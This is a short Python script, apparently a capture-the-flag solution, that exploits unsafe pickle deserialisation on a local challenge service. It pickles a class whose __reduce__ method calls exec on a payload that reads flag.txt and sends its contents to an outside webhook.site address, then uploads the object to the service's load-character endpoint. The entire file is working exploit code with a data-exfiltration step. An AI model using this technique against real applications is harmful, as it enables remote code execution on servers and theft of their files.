import pickle
from io import BytesIO

import requests

WEBHOOK_URL = "http://webhook.site/943a0d7e-b6f0-4b5e-9c41-52d20321e84e"
CHALLENGE_URL = "http://127.0.0.1:8003/load-character"


payload = f"from urllib.request import urlopen;urlopen('{WEBHOOK_URL}/'+open('flag.txt').readline())"


class Exploit:
    def __reduce__(self):
        return (exec, (payload,) )


buffer = BytesIO()
pickle.dump(Exploit(), buffer)
buffer.seek(0)
requests.post(CHALLENGE_URL, files={"file": buffer})
